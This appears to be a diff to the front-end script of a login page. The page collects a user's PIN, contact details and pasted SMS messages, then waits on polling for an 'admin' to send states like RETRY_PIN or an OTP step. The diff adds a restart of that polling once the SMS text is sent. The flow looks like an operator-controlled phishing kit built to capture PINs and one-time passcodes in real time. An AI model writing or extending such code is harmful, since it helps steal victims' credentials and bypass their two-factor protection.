@@ -184,7 +184,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const pin = Array.from(pinBoxes).map(b => b.value).join('');
     const contact = document.getElementById('login-contact').value;
 
-    // Clear previous error states when attempting new login
     const pinErrorEl = document.getElementById('pin-error');
     if (pinErrorEl) pinErrorEl.classList.add('hidden');
 
@@ -227,6 +226,10 @@ document.addEventListener('DOMContentLoaded', () => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ userId: currentUserId, pastedSms })
       });
+      
+      // Restart polling to listen for 'OTP_STEP' from the admin
+      startStatusPolling();
+      
     } catch (err) {
       console.error(err);
     }
@@ -298,7 +301,6 @@ document.addEventListener('DOMContentLoaded', () => {
           switchView('view-success');
         } else if (data.status === 'RETRY_PIN') {
           clearInterval(pollInterval);
-          // Clear PIN input fields
           pinBoxes.forEach(b => b.value = '');
           if (pinBoxes.length > 0) pinBoxes[0].focus();
           switchView('view-login');
@@ -324,4 +326,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-                           
+                          
